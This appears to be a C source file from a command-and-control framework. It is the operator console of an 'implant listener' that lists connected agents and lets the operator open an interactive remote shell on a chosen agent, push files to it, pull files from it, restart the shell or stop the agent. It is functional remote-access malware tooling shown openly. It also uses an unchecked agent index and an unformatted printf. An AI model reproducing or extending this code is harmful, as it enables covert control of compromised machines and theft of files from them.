/*
console.c

This function is responsible for handling user input. It will select an agent to interact with.
It will pass commands to the message handler and receive responses from the message handler

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/time.h>

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "listener_utility.h"
#include "console.h"
#include "listener_handler.h"

// Global variables
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t listener_exit_flag;
extern volatile sig_atomic_t shell_sigint;
extern volatile sig_atomic_t shell_flag;

#define MENU "Provide an option.\n1 - list active agents\n2 - select active agent\n9 - exit\n"
#define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - restart shell\n5 - stop agent\n6 - go back\n"

static int restart_shell(int agent_fd){
	char exit_str[] = "exit\n";

	listener_prepare_message(agent_fd, TYPE_COMMAND, exit_str, strlen(exit_str) + 1);

	return RET_OK;
}

static int shell_console(Agent* agent, int agent_fd){
	int retval;
	char command_buf[PAYLOAD_SIZE];
    fd_set console_fds;
    struct timeval tv;

	printf("\"Ctrl-c\" to leave shell running\n\"exit\" to restart shell");
	print_out("%s", "");

	shell_flag = true;
	while (!shell_sigint && agent->alive){
		tv.tv_sec = 0;
		tv.tv_usec = TIMEOUT_CONST * 100000;	// .1 seconds
		FD_ZERO(&console_fds);
		FD_SET(STDIN, &console_fds);

		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error, shell_console\n");
			listener_exit_flag = true;
			return RET_FATAL_ERROR;
        }
		else if (FD_ISSET(STDIN, &console_fds)){
			memset(command_buf, 0, PAYLOAD_SIZE);
			if (!fgets(command_buf, PAYLOAD_SIZE, stdin)){
				printf("fgets error\n");
				listener_exit_flag = true;
				return RET_FATAL_ERROR;
			}

			debug_print("Sending console command: %s\n", command_buf);

			listener_prepare_message(agent_fd, TYPE_COMMAND, command_buf, strlen(command_buf) + 1);
			print_out("%s\n", "");
		}
	}
	shell_sigint = false;
	shell_flag = false;

	return RET_OK;
}

static int get_file_command(int agent_fd){
	char buf[PAYLOAD_SIZE];

	print_out("%s", "File name");
	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
		printf("ERROR fgets\n");
		return RET_FATAL_ERROR;
	}

	// take newline off
	buf[strcspn(buf, "\n")] = 0;

	debug_print("Get file: %s\n", buf);

	listener_prepare_message(agent_fd, TYPE_GET_FILE_NAME, buf, strlen(buf) + 1);

	return RET_OK;
}

static int put_file_command(int agent_fd){
	int retval = RET_OK;
	char buf[PAYLOAD_SIZE];
	FILE* file_fd;
	int file_size, bytes_read;
	char *file_buffer;

	print_out("%s", "Source file");
	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
		printf("ERROR fgets\n");
		retval =  RET_FATAL_ERROR;
		goto done;
	}

	// take newline off
	buf[strcspn(buf, "\n")] = 0;

	if (access(buf, F_OK) != 0){
		printf("File doesn't exist\n");
		retval = RET_OK;
		goto done;
	}

	if ((file_fd = fopen(buf, "rb")) == 0){
		printf("File access error\n");
		retval = RET_OK;
		goto done;
	}

	if (fseek(file_fd, 0L, SEEK_END) == -1){
		printf("ERROR fseek\n");
		retval = RET_FATAL_ERROR;
		goto done_fp;
	}
	if ((file_size = ftell(file_fd)) == -1){
		printf("ERROR ftell\n");
		retval = RET_FATAL_ERROR;
		goto done_fp;
	}
	rewind(file_fd);

	if ((file_buffer = malloc(file_size)) == NULL){
		retval = RET_FATAL_ERROR;
		goto done_fp;
	}

	bytes_read = fread(file_buffer, 1, file_size, file_fd);
	if (bytes_read != file_size || ferror(file_fd)){
		printf("ERROR fread\n");
		retval = RET_FATAL_ERROR;
		goto done_alloc;
	}

	print_out("%s", "Destination file (default is current directory)");
	if (!fgets(buf, PAYLOAD_SIZE, stdin)){
		printf("fgets error\n");
		retval = RET_FATAL_ERROR;
		goto done_alloc;
	}

	// take newline off
	buf[strcspn(buf, "\n")] = 0;

	listener_prepare_message(agent_fd, TYPE_PUT_FILE_NAME, buf, strlen(buf) + 1);
	listener_prepare_message(agent_fd, TYPE_PUT_FILE, file_buffer, file_size);

	debug_print("Put file: %s, size: %d\n", buf, file_size);

done_alloc:
	free(file_buffer);
done_fp:
	fclose(file_fd);
done:
	return retval;
}

static int agent_console(Agent* agent, int agent_fd){
	int retval;
	char opt_buf[PAYLOAD_SIZE];
	long option;
    fd_set console_fds;
    struct timeval tv;

	print_out(AGENT_MENU, agent_fd);
				 
	while(!listener_exit_flag && agent->alive){
		tv.tv_sec = 0;
    	tv.tv_usec = TIMEOUT_CONST * 100000;	// .1 seconds
    	FD_ZERO(&console_fds);
    	FD_SET(STDIN, &console_fds);

		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error, agent_console\n");
			listener_exit_flag = true;
			return RET_FATAL_ERROR;
        }
		else if (FD_ISSET(STDIN, &console_fds)){
			if (!fgets(opt_buf, PAYLOAD_SIZE, stdin)){
				printf("fgets error\n");
				listener_exit_flag = true;
				return RET_FATAL_ERROR;
			}
			option = strtol(opt_buf, NULL, 10);
			switch(option){
				case 1:
					// console
					if (shell_console(agent, agent_fd) != RET_OK){
						return RET_FATAL_ERROR;
					}
					break;
				case 2:
					// put file
					if (put_file_command(agent_fd) != RET_OK){
						return RET_FATAL_ERROR;
					}
					break;
				case 3:
					// get file
					if (get_file_command(agent_fd) != RET_OK){
						return RET_FATAL_ERROR;
					}
					break;
				case 4:
					// restart shell
					if (restart_shell(agent_fd) != RET_OK){
						return RET_FATAL_ERROR;
					}
					break;
				case 5:
					// close agent
					listener_prepare_message(agent_fd, TYPE_CLOSE_AGENT, NULL, 0);
					return RET_OK;
				case 6:
					// back
					return RET_OK;
				default:
					print_out("%s\n", "Unknown option selected");
					break;
			}
			print_out(AGENT_MENU, agent_fd);
		}
	}
	
	return 0;
}

void *console_thread(void *vargp){
	Connected_Agents* CA = vargp;
	const char banner[] =	"   ___ _   _   ___ _   _   ________  _________ _       ___   _   _ _____ \n"
							"  |_  | | | | |_  | | | | |_   _|  \\/  || ___ \\ |     / _ \\ | \\ | |_   _|\n"
							"    | | | | |   | | | | |   | | | .  . || |_/ / |    / /_\\ \\|  \\| | | |  \n"
							"    | | | | |   | | | | |   | | | |\\/| ||  __/| |    |  _  || . ` | | |  \n"
							"/\\__/ / |_| /\\__/ / |_| |  _| |_| |  | || |   | |____| | | || |\\  | | |  \n"
							"\\____/ \\___/\\____/ \\___/   \\___/\\_|  |_/\\_|   \\_____/\\_| |_/\\_| \\_/ \\_/  \n";
	int retval;
	char buffer[PAYLOAD_SIZE];
	long option;
    fd_set console_fds;
    struct timeval tv;
				 
	printf(banner);
	printf("\nWelcome to the implant listener.");
	
	print_out("%s", MENU);
	while(!listener_exit_flag){
		
		tv.tv_sec = 0;
    	tv.tv_usec = TIMEOUT_CONST * 100000;	// .1 seconds
    	FD_ZERO(&console_fds);
    	FD_SET(STDIN, &console_fds);

		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error, console_thread\n");
			listener_exit_flag = true;
			break;
        }
		else if (FD_ISSET(STDIN, &console_fds)){
			if (!fgets(buffer, PAYLOAD_SIZE, stdin)){
				printf("fgets error\n");
				listener_exit_flag = true;
				break;
			}

			option = strtol(buffer, NULL, 10);
			switch(option){
				case 9:
					listener_exit_flag = true;
					printf("Goodbye\n");
					break;
				case 1:
					printf("\n%s\n", "Active Agents\n-------------");
					pthread_mutex_lock(&CA->lock);
					for (int i = 0; i < FDSIZE; i++){
						if (CA->agents[i].alive) printf(" %d\n", i);
					}
					printf("\n");
					pthread_mutex_unlock(&CA->lock);
					break;
				case 2:
					printf("Which agent?\n");
					fgets(buffer, PAYLOAD_SIZE, stdin);
					option = strtol(buffer, NULL, 10);
					if (CA->agents[option].alive){
						agent_console(&CA->agents[option], option);
					}
					else{
						printf("agent dead\n");
					}
					break;
				default:
					printf("Unknown option selected\n");
					break;
			}
			if (listener_exit_flag) break;
			print_out("%s", MENU);
        }
	}

	debug_print("%s\n", "console_thread done");
	return 0;
}